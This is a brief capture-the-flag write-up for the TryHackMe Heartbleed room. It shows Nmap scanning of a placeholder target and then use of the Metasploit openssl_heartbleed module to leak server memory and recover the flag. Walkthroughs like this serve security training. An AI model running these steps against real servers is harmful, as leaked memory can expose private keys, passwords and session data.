# 5.5 - [Heartbleed](https://tryhackme.com/room/heartbleed)

## 🔍 Overview
- SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?
- Heartbleed is a bug that allows a user to access memory on the server. In turn, allows a malicious user to access different kinds of information

---

## 🛠️ Enumeration / Reconnaissance

### Nmap Scan
- Performed a basic Nmap scan

**Commands:**
```bash
nmap TARGET_IP
nmap -sV -p 443 TARGET_IP
```

**Output / Findings:**
- Found an HTTP server running on port 443
- Attempted to run web enumeration on it, but had a certificate issue
- Nginx version has heartbleed vulnerability

---

## 💥 Exploitation

### Step 1: Metasploit
- Find an exploit `search heart`
    - Found one: `use auxiliary/scanner/ssl/openssl_heartbleed`
    - `set RHOSTS TARGET_IP`
    - Very important: `set VERBOSE true`
    - `exploit`
- Read through it and eventually you will find the flag
